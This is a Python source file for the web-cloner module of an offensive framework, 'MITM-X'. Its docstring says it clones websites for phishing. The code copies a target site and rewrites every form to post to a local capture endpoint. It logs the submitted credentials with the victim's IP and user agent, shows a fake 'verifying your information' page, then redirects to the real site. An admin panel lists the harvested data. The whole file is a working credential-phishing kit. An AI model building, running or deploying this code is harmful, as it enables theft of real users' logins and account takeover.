#!/usr/bin/env python3
"""
Web Cloner Module for MITM-X Framework
Clones websites for phishing and social engineering attacks
"""

import os
import sys
import argparse
import logging
import threading
import time
import re
from urllib.parse import urljoin, urlparse
from flask import Flask, request, render_template_string, redirect, make_response
try:
    import requests
    from bs4 import BeautifulSoup
except ImportError:
    print("Required packages not installed. Run: pip3 install requests beautifulsoup4 flask")
    sys.exit(1)

class WebCloner:
    """
    Web Cloner class to clone websites and serve them locally
    """
    
    def __init__(self, output_dir="cloned_sites/", server_port=8000):
        """
        Initialize Web Cloner
        
        Args:
            output_dir (str): Directory to save cloned sites
            server_port (int): Port to serve cloned sites on
        """
        self.output_dir = output_dir
        self.server_port = server_port
        self.cloned_sites = {}
        self.flask_app = Flask(__name__)
        
        # Create output directory
        os.makedirs(output_dir, exist_ok=True)
        
        # Setup logging
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(__name__)
        
        # Credentials log
        self.credentials_log = os.path.join(output_dir, "captured_credentials.log")
        
        # Setup Flask routes
        self.setup_flask_routes()
    
    def log_credentials(self, data):
        """
        Log captured credentials
        
        Args:
            data (dict): Credential data to log
        """
        try:
            with open(self.credentials_log, 'a') as f:
                import json
                from datetime import datetime
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                log_entry = {
                    'timestamp': timestamp,
                    'ip': request.remote_addr if request else 'unknown',
                    'user_agent': request.headers.get('User-Agent') if request else 'unknown',
                    'data': data
                }
                f.write(json.dumps(log_entry) + '\n')
                
            self.logger.warning(f"Credentials captured: {data}")
        except Exception as e:
            self.logger.error(f"Error logging credentials: {e}")
    
    def clone_website(self, url, site_name=None):
        """
        Clone a website and save it locally
        
        Args:
            url (str): URL to clone
            site_name (str): Name for the cloned site
            
        Returns:
            str: Path to cloned site directory
        """
        try:
            parsed_url = urlparse(url)
            if not site_name:
                site_name = parsed_url.netloc.replace('.', '_')
            
            site_dir = os.path.join(self.output_dir, site_name)
            os.makedirs(site_dir, exist_ok=True)
            
            self.logger.info(f"Cloning website: {url}")
            
            # Fetch main page
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            
            response = requests.get(url, headers=headers, timeout=10)
            response.raise_for_status()
            
            # Parse HTML
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Modify HTML for local serving
            modified_html = self.modify_html_for_local(soup, url, site_name)
            
            # Save main HTML file
            html_file = os.path.join(site_dir, 'index.html')
            with open(html_file, 'w', encoding='utf-8') as f:
                f.write(modified_html)
            
            # Download resources (CSS, JS, images)
            self.download_resources(soup, url, site_dir)
            
            # Store site info
            self.cloned_sites[site_name] = {
                'original_url': url,
                'local_path': site_dir,
                'clone_time': time.time()
            }
            
            self.logger.info(f"Website cloned successfully: {site_dir}")
            return site_dir
            
        except Exception as e:
            self.logger.error(f"Error cloning website {url}: {e}")
            return None
    
    def modify_html_for_local(self, soup, original_url, site_name):
        """
        Modify HTML for local serving and credential capture
        
        Args:
            soup: BeautifulSoup object
            original_url (str): Original website URL
            site_name (str): Site name
            
        Returns:
            str: Modified HTML content
        """
        try:
            parsed_url = urlparse(original_url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            # Fix relative URLs
            for tag in soup.find_all(['a', 'link', 'script', 'img']):
                for attr in ['href', 'src']:
                    if tag.get(attr):
                        if tag[attr].startswith('//'):
                            tag[attr] = f"{parsed_url.scheme}:{tag[attr]}"
                        elif tag[attr].startswith('/'):
                            tag[attr] = f"{base_url}{tag[attr]}"
                        elif not tag[attr].startswith(('http://', 'https://')):
                            tag[attr] = urljoin(original_url, tag[attr])
            
            # Modify forms to capture credentials
            for form in soup.find_all('form'):
                # Store original action
                original_action = form.get('action', '')
                
                # Redirect form to our capture endpoint
                form['action'] = f'/capture/{site_name}'
                form['method'] = 'post'
                
                # Add hidden field with original action
                hidden_input = soup.new_tag('input')
                hidden_input['type'] = 'hidden'
                hidden_input['name'] = '_original_action'
                hidden_input['value'] = original_action
                form.append(hidden_input)
                
                # Add hidden field with original URL
                hidden_url = soup.new_tag('input')
                hidden_url['type'] = 'hidden'
                hidden_url['name'] = '_original_url'
                hidden_url['value'] = original_url
                form.append(hidden_url)
            
            # Add credential capture JavaScript
            capture_js = """
            <script>
            // Capture form submissions
            document.addEventListener('DOMContentLoaded', function() {
                var forms = document.getElementsByTagName('form');
                for (var i = 0; i < forms.length; i++) {
                    forms[i].addEventListener('submit', function(e) {
                        // Allow form to submit normally - data will be captured by server
                        console.log('Form submitted to capture endpoint');
                    });
                }
            });
            </script>
            """
            
            # Insert JavaScript before closing body tag
            if soup.body:
                soup.body.append(BeautifulSoup(capture_js, 'html.parser'))
            
            return str(soup)
            
        except Exception as e:
            self.logger.error(f"Error modifying HTML: {e}")
            return str(soup)
    
    def download_resources(self, soup, base_url, site_dir):
        """
        Download CSS, JS, and image resources
        
        Args:
            soup: BeautifulSoup object
            base_url (str): Base URL for resolving relative paths
            site_dir (str): Directory to save resources
        """
        try:
            # Create subdirectories
            css_dir = os.path.join(site_dir, 'css')
            js_dir = os.path.join(site_dir, 'js')
            img_dir = os.path.join(site_dir, 'images')
            
            for dir_path in [css_dir, js_dir, img_dir]:
                os.makedirs(dir_path, exist_ok=True)
            
            # Download CSS files
            for link in soup.find_all('link', rel='stylesheet'):
                if link.get('href'):
                    self.download_resource(link['href'], base_url, css_dir, 'css')
            
            # Download JavaScript files
            for script in soup.find_all('script', src=True):
                if script.get('src'):
                    self.download_resource(script['src'], base_url, js_dir, 'js')
            
            # Download images
            for img in soup.find_all('img', src=True):
                if img.get('src'):
                    self.download_resource(img['src'], base_url, img_dir, 'images')
        
        except Exception as e:
            self.logger.error(f"Error downloading resources: {e}")
    
    def download_resource(self, resource_url, base_url, save_dir, resource_type):
        """
        Download individual resource file
        
        Args:
            resource_url (str): URL of resource to download
            base_url (str): Base URL for resolving relative paths
            save_dir (str): Directory to save resource
            resource_type (str): Type of resource (css, js, images)
        """
        try:
            # Resolve relative URLs
            if resource_url.startswith('//'):
                resource_url = f"https:{resource_url}"
            elif resource_url.startswith('/'):
                parsed_base = urlparse(base_url)
                resource_url = f"{parsed_base.scheme}://{parsed_base.netloc}{resource_url}"
            elif not resource_url.startswith(('http://', 'https://')):
                resource_url = urljoin(base_url, resource_url)
            
            # Get filename
            filename = os.path.basename(urlparse(resource_url).path)
            if not filename:
                filename = f"resource_{hash(resource_url) % 1000000}"
            
            # Add appropriate extension if missing
            if resource_type == 'css' and not filename.endswith('.css'):
                filename += '.css'
            elif resource_type == 'js' and not filename.endswith('.js'):
                filename += '.js'
            
            file_path = os.path.join(save_dir, filename)
            
            # Download resource
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            response = requests.get(resource_url, headers=headers, timeout=5)
            response.raise_for_status()
            
            # Save file
            with open(file_path, 'wb') as f:
                f.write(response.content)
            
            self.logger.debug(f"Downloaded {resource_type}: {filename}")
        
        except Exception as e:
            self.logger.debug(f"Failed to download resource {resource_url}: {e}")
    
    def setup_flask_routes(self):
        """
        Setup Flask routes for serving cloned sites
        """
        @self.flask_app.route('/')
        def index():
            """Main index page showing available cloned sites"""
            sites_list = ""
            for site_name, info in self.cloned_sites.items():
                sites_list += f'<li><a href="/site/{site_name}">{site_name}</a> - {info["original_url"]}</li>'
            
            html = f"""
            <html>
            <head><title>MITM-X Web Cloner</title></head>
            <body>
                <h1>Cloned Websites</h1>
                <ul>{sites_list}</ul>
                <p><a href="/admin">Admin Panel</a></p>
            </body>
            </html>
            """
            return html
        
        @self.flask_app.route('/site/<site_name>')
        def serve_site(site_name):
            """Serve cloned website"""
            if site_name in self.cloned_sites:
                site_dir = self.cloned_sites[site_name]['local_path']
                index_file = os.path.join(site_dir, 'index.html')
                
                if os.path.exists(index_file):
                    with open(index_file, 'r', encoding='utf-8') as f:
                        return f.read()
            
            return "Site not found", 404
        
        @self.flask_app.route('/capture/<site_name>', methods=['POST'])
        def capture_credentials(site_name):
            """Capture form submissions"""
            try:
                # Capture all form data
                form_data = request.form.to_dict()
                
                # Log credentials
                self.log_credentials({
                    'site': site_name,
                    'form_data': form_data,
                    'url': request.url,
                    'referer': request.headers.get('Referer')
                })
                
                # Get original action and URL
                original_action = form_data.get('_original_action', '')
                original_url = form_data.get('_original_url', '')
                
                # Remove our hidden fields
                form_data.pop('_original_action', None)
                form_data.pop('_original_url', None)
                
                # Create response based on original site behavior
                if original_url and original_action:
                    if original_action.startswith('/'):
                        parsed_url = urlparse(original_url)
                        redirect_url = f"{parsed_url.scheme}://{parsed_url.netloc}{original_action}"
                    elif original_action.startswith('http'):
                        redirect_url = original_action
                    else:
                        redirect_url = urljoin(original_url, original_action)
                    
                    # Show success message then redirect
                    success_html = f"""
                    <html>
                    <head>
                        <title>Processing...</title>
                        <meta http-equiv="refresh" content="3;url={redirect_url}">
                    </head>
                    <body>
                        <h2>Processing your request...</h2>
                        <p>Please wait while we verify your information.</p>
                        <p>You will be redirected automatically.</p>
                        <script>
                        setTimeout(function() {{
                            window.location.href = '{redirect_url}';
                        }}, 3000);
                        </script>
                    </body>
                    </html>
                    """
                    return success_html
                else:
                    return "Form submitted successfully!", 200
            
            except Exception as e:
                self.logger.error(f"Error capturing credentials: {e}")
                return "Error processing form", 500
        
        @self.flask_app.route('/admin')
        def admin_panel():
            """Admin panel for viewing captured data"""
            try:
                captured_data = []
                if os.path.exists(self.credentials_log):
                    with open(self.credentials_log, 'r') as f:
                        for line in f:
                            try:
                                import json
                                captured_data.append(json.loads(line.strip()))
                            except:
                                pass
                
                # Generate HTML for captured data
                data_html = ""
                for entry in reversed(captured_data[-50:]):  # Show last 50 entries
                    data_html += f"""
                    <tr>
                        <td>{entry.get('timestamp', '')}</td>
                        <td>{entry.get('ip', '')}</td>
                        <td>{entry.get('data', {}).get('site', '')}</td>
                        <td>{str(entry.get('data', {}).get('form_data', {}))}</td>
                    </tr>
                    """
                
                admin_html = f"""
                <html>
                <head><title>MITM-X Admin Panel</title></head>
                <body>
                    <h1>Captured Credentials</h1>
                    <table border="1">
                        <tr>
                            <th>Timestamp</th>
                            <th>IP</th>
                            <th>Site</th>
                            <th>Data</th>
                        </tr>
                        {data_html}
                    </table>
                    <p><a href="/">Back to Sites</a></p>
                </body>
                </html>
                """
                return admin_html
            
            except Exception as e:
                return f"Error loading admin panel: {e}", 500
    
    def start_server(self, host="0.0.0.0"):
        """
        Start Flask server to serve cloned sites
        
        Args:
            host (str): Host to bind to
        """
        self.logger.info(f"Starting web server on {host}:{self.server_port}")
        
        try:
            # Disable Flask logging for cleaner output
            import logging as flask_logging
            flask_logging.getLogger('werkzeug').setLevel(flask_logging.ERROR)
            
            self.flask_app.run(host=host, port=self.server_port, debug=False)
        except Exception as e:
            self.logger.error(f"Error starting server: {e}")
    
    def stop_server(self):
        """
        Stop Flask server
        """
        self.logger.info("Server stopped")

def main():
    """
    Main function for standalone execution
    """
    parser = argparse.ArgumentParser(description="Web Cloner for MITM attacks")
    parser.add_argument("--url", "-u", help="URL to clone")
    parser.add_argument("--output", "-o", default="cloned_sites/", help="Output directory")
    parser.add_argument("--port", "-p", type=int, default=8000, help="Server port")
    parser.add_argument("--name", "-n", help="Name for cloned site")
    parser.add_argument("--serve-only", action="store_true", help="Only serve existing cloned sites")
    
    args = parser.parse_args()
    
    # Create web cloner
    cloner = WebCloner(args.output, args.port)
    
    if not args.serve_only and args.url:
        # Clone website
        site_path = cloner.clone_website(args.url, args.name)
        if site_path:
            print(f"Website cloned to: {site_path}")
    
    # Start server
    try:
        print(f"Starting server on port {args.port}")
        print("Access cloned sites at: http://localhost:{}/".format(args.port))
        cloner.start_server()
    except KeyboardInterrupt:
        print("\nStopping web cloner...")
        cloner.stop_server()

if __name__ == "__main__":
    main()
